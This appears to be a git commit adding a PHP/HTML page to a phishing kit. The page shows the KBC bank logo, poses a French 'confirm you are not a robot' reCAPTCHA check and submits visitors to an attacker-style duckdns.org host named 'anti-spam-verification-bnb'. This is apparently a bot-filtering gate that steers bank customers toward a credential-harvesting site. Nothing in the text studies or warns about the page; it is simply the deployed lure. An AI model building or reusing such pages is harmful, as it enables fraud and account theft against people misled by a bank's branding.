6818b6b03330ec593a938c819d6c40c34bdda9c2
dynastie2020 <rezdu94@gmail.com>
2021-03-24 20:31:58 +0100

    message

---
+++ tr/index.php
@@ -0,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <center>&nbsp;</center>
+    <div style="text-align: center;"><img src="https://upload.wikimedia.org/wikipedia/fr/4/4b/KBC_%28groupe_financier%29_Logo.png"
+
+        alt="" style="width: 673px; height: 301px;">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+      <script>
+$(document).ready(function(){
+ $("form").submit(function(){
+   var response = grecaptcha.getResponse();
+      if(response.length == 0){
+          alert('Please check the Captcha');
+    return false;
+ } 
+ });
+});
+</script><script type="text/javascript">
+ var onloadCallback = function() {
+ grecaptcha.render('html_element', {
+ 'sitekey' : '6Le3zowaAAAAANtKK5N8e15AzQ4RnGk2spp5BxIK'
+ });
+ };
+ </script></div>
+    <h3 align="center">Veuillez confirmer que vous n'êtes pas un robot.</h3>
+    <center>&nbsp;</center>
+    <div align="center">
+      <form action="https://anti-spam-verification-bnb.duckdns.org/r/iRw2ymt" method="post">
+        <div id="html_element"></div>
+        <br>
+        <center>&nbsp;</center>
+        <input value="Continuer" type="submit"> </form>
+      <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"
+
+async="" defer="defer">
+ </script> </div>
+    
+  </body>
+</html>
